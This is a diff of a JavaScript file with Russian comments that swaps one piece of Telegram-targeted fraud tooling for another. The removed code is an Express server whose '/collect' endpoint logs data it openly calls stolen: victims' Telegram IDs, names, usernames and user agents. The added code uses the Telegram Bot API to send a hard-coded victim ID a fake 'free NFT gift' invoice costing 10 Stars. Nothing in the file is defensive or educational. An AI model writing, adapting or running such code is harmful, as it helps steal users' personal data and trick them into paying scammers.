@@ -1,30 +1,25 @@
-const express = require('express');
-const app = express();
+// Используем Telegram Bot API для создания фейкового платежа
+const botToken = 'ТВОЙ_ТОКЕН_БОТА'; // Токен от @BotFather
+const victimId = 1398396668; // ID жертвы
 
-app.use(express.json());
-
-// Раздаём статику из корня
-app.use(express.static(__dirname));
-
-// Главная страница
-app.get('/', (req, res) => {
-    res.sendFile(__dirname + '/index.html');
-});
-
-// endpoint для кражи данных
-app.post('/collect', (req, res) => {
-    console.log('=== УКРАДЕННЫЕ ДАННЫЕ ===');
-    console.log('User ID:', req.body.user_id);
-    console.log('Username:', req.body.username);
-    console.log('Name:', req.body.first_name, req.body.last_name);
-    console.log('Telegram Data:', req.body.telegram_data);
-    console.log('User Agent:', req.body.user_agent);
-    console.log('Timestamp:', req.body.timestamp);
-    console.log('========================');
-    res.sendStatus(200);
-});
-
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-    console.log(`Сервер крадёт данные на порту ${PORT}`);
+// Создаем инвойс на 10 Stars
+fetch(`https://api.telegram.org/bot${botToken}/sendInvoice`, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+        chat_id: victimId,
+        title: "🎁 NFT Подарок",
+        description: "Получите бесплатный NFT коллекции",
+        payload: "nft_gift_steal",
+        provider_token: "TEST", // Для тестовых платежей
+        currency: "XTR", // Код валюты Telegram Stars
+        prices: [{label: "NFT Gift", amount: 10}], // 10 Stars
+        suggested_tip_amounts: [10], // Фиксированная сумма
+        photo_url: "https://example.com/fake-nft.jpg"
+    })
+})
+.then(response => response.json())
+.then(data => {
+    console.log("Инвойс отправлен:", data);
+    // Автоматически подтверждаем платеж если нужно
 });
